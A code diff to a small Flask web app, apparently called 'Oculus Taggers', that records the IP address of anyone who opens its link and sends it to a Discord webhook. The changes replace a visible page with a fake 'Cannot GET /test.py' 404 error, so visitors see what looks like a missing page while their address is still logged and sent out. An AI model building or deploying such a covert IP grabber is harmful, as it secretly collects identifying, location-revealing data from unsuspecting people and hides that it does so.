@@ -5,9 +5,8 @@ from flask import Flask, request
 
 app = Flask(__name__)
 
+# Discord webhook stored in Vercel Environment Variables
 WEBHOOK_URL = os.environ.get("ATTESTATION_WEBHOOK_URL")
-
-GIF_URL = "https://cdn.discordapp.com/attachments/1549797438578106449/1549819140980613130/togif.gif?ex=6abfdb8d&is=6abe8a0d&hm=5132d39f0c050c9bf11fee87644c198885d7e975cb4bada545f0d35966a984f4"
 
 
 def get_visitor_ip():
@@ -28,7 +27,7 @@ def send_webhook(ip):
         "username": "Oculus Taggers",
         "embeds": [
             {
-                "title": "Damn Son.",
+                "title": "Link Opened",
                 "description": "Someone opened the Oculus Taggers link.",
                 "fields": [
                     {
@@ -37,9 +36,6 @@ def send_webhook(ip):
                         "inline": False
                     }
                 ],
-                "image": {
-                    "url": GIF_URL
-                },
                 "footer": {
                     "text": "Oculus Taggers"
                 }
@@ -74,18 +70,7 @@ def home():
     ip = get_visitor_ip()
     send_webhook(ip)
 
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Oculus Taggers</title>
-    </head>
-    <body>
-        <h1>Oculus Taggers</h1>
-        <p>bird.</p>
-    </body>
-    </html>
-    """
+    return "Cannot GET /test.py", 404
 
 
 @app.route("/api/test")
